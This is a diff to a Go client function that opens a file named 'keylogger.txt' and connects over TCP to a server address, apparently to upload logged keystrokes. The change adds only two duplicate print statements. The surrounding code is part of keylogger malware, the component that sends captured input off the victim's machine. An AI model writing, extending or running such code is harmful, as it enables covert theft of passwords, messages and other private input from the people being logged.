@@ -30,6 +30,7 @@ func StartClient() {
 	// Open the file you want to send
 	fmt.Println("Trying to open generated file...")
 	file, err := os.Open("keylogger.txt")
+	fmt.Println("Trying to open generated file...")
 	if err != nil {
 		fmt.Println("Error opening file:", err)
 		return
@@ -39,6 +40,7 @@ func StartClient() {
 	// Connect to the server
 	fmt.Println("Trying to connect to the server...")
 	conn, err := net.Dial("tcp", serverAddress)
+	fmt.Println("Trying to connect to the server...")
 	if err != nil {
 		fmt.Println("Error connecting to the server:", err)
 		return
